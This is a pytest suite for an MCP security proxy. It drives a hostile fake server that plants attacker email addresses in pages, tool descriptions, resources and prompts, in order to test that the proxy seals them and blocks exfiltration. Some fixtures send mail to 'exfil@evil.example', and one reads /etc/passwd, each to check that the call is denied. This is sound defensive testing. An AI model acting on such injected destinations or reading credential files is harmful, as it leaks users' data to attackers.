"""End-to-end tests for the MCP proxy.

These drive a real subprocess speaking real MCP over real pipes, against a
deliberately hostile server (``tests/fake_mcp_server.py``). Nothing is mocked
at the protocol boundary, because the questions that matter -- did the injected
address reach the model, did the denied call reach the server -- can only be
answered by looking at what actually crossed the wire.

The server records every ``tools/call`` it receives. A denial is proven by that
record staying empty, not by inspecting the proxy's own opinion of itself.
"""

from __future__ import annotations

import json
import re
import subprocess
import sys
import time
from pathlib import Path

import pytest

ROOT = Path(__file__).resolve().parent.parent
SERVER = ROOT / "tests" / "fake_mcp_server.py"
ATTACKER = "exfil@evil.example"
PRINCIPAL = "ana@corp.example"

CONTRACTS = {
    "schema": "idensec.contracts/v1",
    "contracts": [
        {
            "tool": "fetch_page",
            "version": 1,
            "effects": ["read", "network_egress"],
            "default_role": "authority",
            "parameters": {"url": {"role": "authority", "kinds": ["url"]}},
        },
        {
            "tool": "send_email",
            "version": 1,
            "effects": ["write", "network_egress"],
            "default_role": "authority",
            "parameters": {
                "to": {"role": "authority", "kinds": ["email"]},
                "subject": {"role": "payload"},
                "body": {"role": "payload"},
            },
        },
        {
            "tool": "read_file",
            "version": 1,
            "effects": ["read"],
            "default_role": "authority",
            "parameters": {"path": {"role": "authority", "kinds": ["posix_path"]}},
        },
    ],
}


class ProxyRun:
    """The transcript of one proxy session."""

    def __init__(self, responses: list[dict], received: list[dict], stderr: str) -> None:
        self.responses = responses
        self.received = received
        self.stderr = stderr

    def result(self, request_id: int) -> dict:
        for message in self.responses:
            if message.get("id") == request_id:
                return message
        raise AssertionError(f"no response for id {request_id}: {self.responses}")

    def text(self, request_id: int) -> str:
        result = self.result(request_id).get("result", {})
        return "\n".join(
            block.get("text", "")
            for block in result.get("content", [])
            if isinstance(block, dict)
        )

    def is_error(self, request_id: int) -> bool:
        return bool(self.result(request_id).get("result", {}).get("isError"))

    def tools_called(self) -> list[str]:
        return [entry.get("name") for entry in self.received]


@pytest.fixture
def run_proxy(tmp_path: Path):
    """Drive the proxy interactively over real pipes.

    Steps are messages, or callables receiving the responses seen so far and
    returning the next message. The callable form matters: a realistic agent
    composes its next tool call out of the sealed content the previous one
    returned, and handles are session-scoped, so a test that cannot do that
    cannot exercise the interesting path.
    """

    def _run(steps: list, *, task: str | None = None, **overrides) -> ProxyRun:
        record = tmp_path / "received.jsonl"
        contracts_path = tmp_path / "contracts.json"
        contracts_path.write_text(json.dumps(CONTRACTS), encoding="utf-8")

        config = {
            "schema": "idensec.proxy/v1",
            "source": {"id": "hostile", "trust": "tool_untrusted"},
            "policy": "strict",
            "contracts": str(contracts_path),
            "server": [sys.executable, str(SERVER), "--record", str(record)],
            "audit": str(tmp_path / "audit.jsonl"),
        }
        if task is not None:
            task_path = tmp_path / "task.txt"
            task_path.write_text(task, encoding="utf-8")
            config["task_file"] = str(task_path)
        config.update(overrides)

        config_path = tmp_path / "proxy.json"
        config_path.write_text(json.dumps(config), encoding="utf-8")
        stderr_path = tmp_path / "stderr.log"

        responses: list[dict] = []
        with stderr_path.open("wb") as stderr_file:
            process = subprocess.Popen(  # noqa: S603 - fixed test command
                [sys.executable, "-m", "idensec.mcp", "--config", str(config_path)],
                stdin=subprocess.PIPE,
                stdout=subprocess.PIPE,
                stderr=stderr_file,
                cwd=ROOT,
                env={"PYTHONPATH": str(ROOT / "src"), "PATH": "/usr/bin:/bin"},
            )
            assert process.stdin is not None and process.stdout is not None
            try:
                for step in steps:
                    message = step(responses) if callable(step) else step
                    process.stdin.write(json.dumps(message).encode() + b"\n")
                    process.stdin.flush()
                    if "id" not in message:
                        continue  # a notification draws no reply
                    deadline = time.monotonic() + 30
                    while not any(r.get("id") == message["id"] for r in responses):
                        if time.monotonic() > deadline:
                            raise AssertionError(f"timed out awaiting id {message['id']}")
                        line = process.stdout.readline()
                        if not line:
                            raise AssertionError("proxy closed stdout unexpectedly")
                        if line.strip():
                            responses.append(json.loads(line))
            finally:
                process.stdin.close()
                process.wait(timeout=30)
                for line in process.stdout:
                    if line.strip():
                        responses.append(json.loads(line))

        received = [
            json.loads(line)
            for line in (record.read_text().splitlines() if record.exists() else [])
        ]
        return ProxyRun(responses, received, stderr_path.read_text())

    return _run


def call(request_id: int, tool: str, arguments: dict) -> dict:
    return {
        "jsonrpc": "2.0",
        "id": request_id,
        "method": "tools/call",
        "params": {"name": tool, "arguments": arguments},
    }


class TestPassThrough:
    def test_initialize_is_forwarded_untouched(self, run_proxy) -> None:
        run = run_proxy([{"jsonrpc": "2.0", "id": 1, "method": "initialize", "params": {}}])
        assert run.result(1)["result"]["serverInfo"]["name"] == "fake-hostile-server"

    def test_unknown_methods_are_forwarded(self, run_proxy) -> None:
        """A proxy that only forwards what it recognises breaks on the next
        protocol revision."""
        run = run_proxy([{"jsonrpc": "2.0", "id": 1, "method": "logging/setLevel"}])
        assert "error" in run.result(1)

    def test_notifications_do_not_stall_the_proxy(self, run_proxy) -> None:
        run = run_proxy(
            [
                {"jsonrpc": "2.0", "method": "notifications/initialized"},
                {"jsonrpc": "2.0", "id": 2, "method": "initialize", "params": {}},
            ]
        )
        assert run.result(2)["result"]["protocolVersion"]


class TestReadBoundary:
    def test_injected_address_is_sealed_before_it_reaches_the_model(
        self, run_proxy
    ) -> None:
        run = run_proxy(
            [call(1, "fetch_page", {"url": "https://status.corp.example/incident"})],
            task="Summarise https://status.corp.example/incident and mail ana@corp.example",
        )
        page = run.text(1)
        assert ATTACKER not in page
        assert "evil.example" not in page
        assert "[[idn:email:" in page
        assert "Incident 4471" in page, "prose must survive; this is not content filtering"

    def test_tool_descriptions_are_sealed(self, run_proxy) -> None:
        """MCP tool descriptions are server-supplied, which makes them the
        tool-poisoning path."""
        run = run_proxy([{"jsonrpc": "2.0", "id": 1, "method": "tools/list"}])
        listed = json.dumps(run.result(1)["result"]["tools"])
        assert "audit@evil.example" not in listed
        assert "[[idn:email:" in listed

    def test_tool_names_and_schemas_are_never_rewritten(self, run_proxy) -> None:
        run = run_proxy([{"jsonrpc": "2.0", "id": 1, "method": "tools/list"}])
        tools = run.result(1)["result"]["tools"]
        assert {t["name"] for t in tools} == {"fetch_page", "send_email", "read_file"}
        schema = next(t for t in tools if t["name"] == "send_email")["inputSchema"]
        assert set(schema["properties"]) == {"to", "subject", "body"}


class TestEveryContentPathIsSealed:
    """tools/call is not the only way content reaches the model.

    MCP delivers model-visible text through resources/read, prompts/get and
    resources/list as well. A proxy that seals only tool results leaves an
    attacker-controlled resource free to hand the model an address in clear --
    which is the bypass these tests were written to prove existed, before the
    fix that closed it.
    """

    def test_resource_contents_are_sealed(self, run_proxy) -> None:
        run = run_proxy(
            [{"jsonrpc": "2.0", "id": 1, "method": "resources/read",
              "params": {"uri": "file:///srv/docs/incident-4471.md"}}],
            task="Summarise the incident and mail ana@corp.example",
        )
        body = json.dumps(run.result(1)["result"])
        assert ATTACKER not in body
        assert "[[idn:email:" in body

    def test_prompt_content_is_sealed(self, run_proxy) -> None:
        run = run_proxy(
            [{"jsonrpc": "2.0", "id": 1, "method": "prompts/get",
              "params": {"name": "incident"}}],
            task="Summarise the incident and mail ana@corp.example",
        )
        body = json.dumps(run.result(1)["result"])
        assert ATTACKER not in body

    def test_resource_listings_are_sealed(self, run_proxy) -> None:
        run = run_proxy(
            [{"jsonrpc": "2.0", "id": 1, "method": "resources/list"}],
            task="Summarise the incident and mail ana@corp.example",
        )
        body = json.dumps(run.result(1)["result"])
        assert ATTACKER not in body

    def test_an_address_learned_from_a_resource_is_still_refused(self, run_proxy) -> None:
        """Sealing is only half of it: the provenance must carry through so the
        write boundary refuses the value the resource supplied."""
        run = run_proxy(
            [
                {"jsonrpc": "2.0", "id": 1, "method": "resources/read",
                 "params": {"uri": "file:///srv/docs/incident-4471.md"}},
                call(2, "send_email", {"to": ATTACKER, "subject": "s", "body": "b"}),
            ],
            task="Summarise the incident and mail ana@corp.example",
        )
        assert run.is_error(2)
        assert run.tools_called() == []

    def test_initialize_is_left_alone(self, run_proxy) -> None:
        """Protocol metadata must survive intact; a sealed protocolVersion
        would break the handshake."""
        run = run_proxy([{"jsonrpc": "2.0", "id": 1, "method": "initialize", "params": {}}])
        result = run.result(1)["result"]
        assert result["protocolVersion"] == "2025-06-18"
        assert result["serverInfo"]["name"] == "fake-hostile-server"

    def test_tool_schemas_are_never_sealed(self, run_proxy) -> None:
        """Sealing inside a JSON Schema would corrupt it -- the one place
        aggressive sealing must not reach."""
        run = run_proxy([{"jsonrpc": "2.0", "id": 1, "method": "tools/list"}])
        schema = next(
            t for t in run.result(1)["result"]["tools"] if t["name"] == "send_email"
        )["inputSchema"]
        assert schema["type"] == "object"
        assert set(schema["properties"]) == {"to", "subject", "body"}
        assert "[[idn:" not in json.dumps(schema)


class TestWriteBoundary:
    def test_injected_destination_never_reaches_the_server(self, run_proxy) -> None:
        """The denial is proven by the server's own record, not by the proxy."""
        run = run_proxy(
            [
                call(1, "fetch_page", {"url": "https://status.corp.example/incident"}),
                call(2, "send_email", {"to": ATTACKER, "subject": "x", "body": "y"}),
            ],
            task="Summarise https://status.corp.example/incident and mail ana@corp.example",
        )
        assert run.is_error(2)
        assert run.tools_called() == ["fetch_page"]

    def test_denial_text_carries_no_detail(self, run_proxy) -> None:
        run = run_proxy(
            [call(1, "send_email", {"to": ATTACKER, "subject": "x", "body": "y"})],
            task="Mail the summary to ana@corp.example",
        )
        assert "evil" not in run.text(1)
        assert "exfil" not in run.text(1)

    def test_principal_chosen_destination_is_delivered(self, run_proxy) -> None:
        run = run_proxy(
            [call(1, "send_email", {"to": PRINCIPAL, "subject": "x", "body": "y"})],
            task="Mail the summary to ana@corp.example",
        )
        assert not run.is_error(1)
        assert run.tools_called() == ["send_email"]
        assert run.received[0]["arguments"]["to"] == PRINCIPAL

    def test_handles_are_resolved_before_the_server_sees_them(self, run_proxy) -> None:
        """The server must receive real values, never handles."""
        run = run_proxy(
            [
                call(1, "fetch_page", {"url": "https://status.corp.example/incident"}),
                call(
                    2,
                    "send_email",
                    {"to": PRINCIPAL, "subject": "s", "body": "[[idn:email:0000000000000000]]"},
                ),
            ],
            task="Summarise https://status.corp.example/incident and mail ana@corp.example",
        )
        # An unknown handle is denied rather than passed through as literal text.
        assert run.is_error(2)
        assert run.tools_called() == ["fetch_page"]

    def test_sealed_content_round_trips_into_a_payload(self, run_proxy) -> None:
        """The realistic flow: fetch, then mail what was fetched.

        The agent passes back the sealed text it was given, handles and all.
        The tool must receive real values, and the untrusted prose must be
        allowed through -- only the destination had to be justified.
        """

        def mail_the_page(responses: list[dict]) -> dict:
            page = "\n".join(
                block["text"]
                for message in responses
                if message.get("id") == 1
                for block in message["result"]["content"]
            )
            assert "[[idn:email:" in page, "precondition: the page was sealed"
            return call(2, "send_email", {"to": PRINCIPAL, "subject": "s", "body": page})

        run = run_proxy(
            [
                call(1, "fetch_page", {"url": "https://status.corp.example/incident"}),
                mail_the_page,
            ],
            task="Summarise https://status.corp.example/incident and mail ana@corp.example",
        )
        assert not run.is_error(2)
        delivered = run.received[1]["arguments"]["body"]
        assert "[[idn:" not in delivered, "handles must be resolved before the tool sees them"
        assert ATTACKER in delivered, "payload may carry untrusted content; that is the point"

    def test_referencing_an_injected_handle_as_a_destination_is_denied(
        self, run_proxy
    ) -> None:
        """The cooperative path fails too: the handle carries the origin that
        denies it."""

        def mail_via_handle(responses: list[dict]) -> dict:
            page = "\n".join(
                block["text"]
                for message in responses
                if message.get("id") == 1
                for block in message["result"]["content"]
            )
            handle = re.search(r"\[\[idn:email:[0-9a-f]{16}\]\]", page)
            assert handle is not None
            return call(2, "send_email", {"to": handle.group(0), "subject": "s", "body": "b"})

        run = run_proxy(
            [
                call(1, "fetch_page", {"url": "https://status.corp.example/incident"}),
                mail_via_handle,
            ],
            task="Summarise https://status.corp.example/incident and mail ana@corp.example",
        )
        assert run.is_error(2)
        assert run.tools_called() == ["fetch_page"]


class TestFailClosed:
    def test_tool_without_a_contract_is_denied(self, run_proxy) -> None:
        run = run_proxy(
            [call(1, "read_file", {"path": "/etc/passwd"})],
            task="Read the log",
            contracts=None,
        )
        assert run.is_error(1)
        assert run.tools_called() == []

    def test_no_task_file_denies_authority_values(self, run_proxy) -> None:
        """Honest consequence of MCP carrying no trusted channel for intent."""
        run = run_proxy([call(1, "send_email", {"to": PRINCIPAL, "subject": "s", "body": "b"})])
        assert run.is_error(1)
        assert "no task_file" in run.stderr

    def test_bad_config_refuses_to_start(self, tmp_path: Path) -> None:
        config_path = tmp_path / "bad.json"
        config_path.write_text(
            json.dumps({"schema": "idensec.proxy/v1", "source": {"id": "x"}})
        )
        completed = subprocess.run(  # noqa: S603 - fixed test command
            [sys.executable, "-m", "idensec.mcp", "--config", str(config_path)],
            capture_output=True,
            cwd=ROOT,
            env={"PYTHONPATH": str(ROOT / "src"), "PATH": "/usr/bin:/bin"},
            timeout=30,
        )
        assert completed.returncode == 2
        assert b"source.trust" in completed.stderr


class TestObserveMode:
    def test_observe_mode_enforces_nothing_but_records(self, run_proxy) -> None:
        run = run_proxy(
            [call(1, "send_email", {"to": ATTACKER, "subject": "x", "body": "y"})],
            task="Mail ana@corp.example",
            policy="observe",
        )
        assert not run.is_error(1)
        assert run.tools_called() == ["send_email"]

    def test_draft_contracts_are_emitted_from_advertised_schemas(
        self, run_proxy, tmp_path: Path
    ) -> None:
        drafts = tmp_path / "drafts.json"
        run_proxy(
            [{"jsonrpc": "2.0", "id": 1, "method": "tools/list"}],
            emit_contracts=str(drafts),
        )
        assert drafts.exists()
        data = json.loads(drafts.read_text())
        by_tool = {c["tool"]: c for c in data["contracts"]}
        assert set(by_tool) == {"fetch_page", "send_email", "read_file"}
        assert by_tool["send_email"]["parameters"]["to"]["role"] == "authority"
        assert by_tool["send_email"]["parameters"]["body"]["role"] == "payload"
        assert by_tool["send_email"]["effects"] == [], "effects must never be inferred"


class TestBudgets:
    def test_an_aggregate_limit_is_enforced_across_calls(self, run_proxy) -> None:
        """Each call is individually authorised; the third is not, in aggregate."""
        run = run_proxy(
            [
                call(1, "send_email", {"to": "ana@corp.example", "subject": "s", "body": "b"}),
                call(2, "send_email", {"to": "bo@corp.example", "subject": "s", "body": "b"}),
                call(3, "send_email", {"to": "cy@corp.example", "subject": "s", "body": "b"}),
            ],
            task=(
                "Mail the summary to ana@corp.example, bo@corp.example and "
                "cy@corp.example."
            ),
            budgets=[
                {
                    "name": "recipients",
                    "limit": 2,
                    "meter": "distinct",
                    "parameter": "to",
                    "effects": ["network_egress"],
                }
            ],
        )
        assert not run.is_error(1)
        assert not run.is_error(2)
        assert run.is_error(3)
        assert run.tools_called() == ["send_email", "send_email"]

    def test_a_malformed_budget_refuses_to_start(self, tmp_path: Path) -> None:
        config_path = tmp_path / "bad.json"
        config_path.write_text(
            json.dumps(
                {
                    "schema": "idensec.proxy/v1",
                    "source": {"id": "x", "trust": "tool_untrusted"},
                    "budgets": [{"name": "x", "limit": 5, "meter": "sum"}],
                    "server": ["true"],
                }
            )
        )
        completed = subprocess.run(  # noqa: S603 - fixed test command
            [sys.executable, "-m", "idensec.mcp", "--config", str(config_path)],
            capture_output=True,
            cwd=ROOT,
            env={"PYTHONPATH": str(ROOT / "src"), "PATH": "/usr/bin:/bin"},
            timeout=30,
        )
        assert completed.returncode == 2
        assert b"invalid budget" in completed.stderr


class TestStartupLint:
    def test_contract_defects_are_reported_at_startup(self, run_proxy, tmp_path: Path) -> None:
        """Startup is the last moment anyone looks at a contract."""
        broken = tmp_path / "broken.json"
        broken.write_text(
            json.dumps(
                {
                    "schema": "idensec.contracts/v1",
                    "contracts": [
                        {
                            "tool": "send_email",
                            "effects": ["network_egress"],
                            "default_role": "authority",
                            "parameters": {"to": {"role": "payload"}},
                        }
                    ],
                }
            )
        )
        run = run_proxy(
            [{"jsonrpc": "2.0", "id": 1, "method": "initialize", "params": {}}],
            task="Mail ana@corp.example",
            contracts=str(broken),
        )
        assert "contract lint" in run.stderr
        assert "authority-name-downgraded" in run.stderr

    def test_a_clean_contract_set_produces_no_lint_noise(self, run_proxy) -> None:
        """A linter that cries wolf gets switched off."""
        run = run_proxy(
            [{"jsonrpc": "2.0", "id": 1, "method": "initialize", "params": {}}],
            task="Mail ana@corp.example",
        )
        assert "contract lint" not in run.stderr

    def test_lint_findings_do_not_prevent_startup(self, run_proxy, tmp_path: Path) -> None:
        """The linter reasons from names; a false positive must not be able to
        take a deployment down."""
        broken = tmp_path / "broken.json"
        broken.write_text(
            json.dumps(
                {
                    "schema": "idensec.contracts/v1",
                    "contracts": [
                        {
                            "tool": "send_email",
                            "effects": ["network_egress"],
                            "default_role": "authority",
                            "parameters": {"to": {"role": "payload"}},
                        }
                    ],
                }
            )
        )
        run = run_proxy(
            [{"jsonrpc": "2.0", "id": 1, "method": "initialize", "params": {}}],
            task="Mail ana@corp.example",
            contracts=str(broken),
        )
        assert run.result(1)["result"]["serverInfo"]["name"] == "fake-hostile-server"


class TestAudit:
    def test_decisions_are_written_to_the_audit_log(self, run_proxy, tmp_path: Path) -> None:
        run = run_proxy(
            [call(1, "send_email", {"to": ATTACKER, "subject": "x", "body": "y"})],
            task="Mail ana@corp.example",
        )
        audit = tmp_path / "audit.jsonl"
        assert audit.exists()
        records = [json.loads(line) for line in audit.read_text().splitlines()]
        assert records[0]["payload"]["verdict"] == "deny"
        assert records[0]["payload"]["tool"] == "send_email"
        del run

    def test_audit_records_chain(self, run_proxy, tmp_path: Path) -> None:
        run_proxy(
            [
                call(1, "send_email", {"to": ATTACKER, "subject": "x", "body": "y"}),
                call(2, "send_email", {"to": PRINCIPAL, "subject": "x", "body": "y"}),
            ],
            task="Mail ana@corp.example",
            policy="supervised",
        )
        audit = tmp_path / "audit.jsonl"
        records = [json.loads(line) for line in audit.read_text().splitlines()]
        assert len(records) >= 2
        assert records[1]["previous"] == records[0]["digest"]
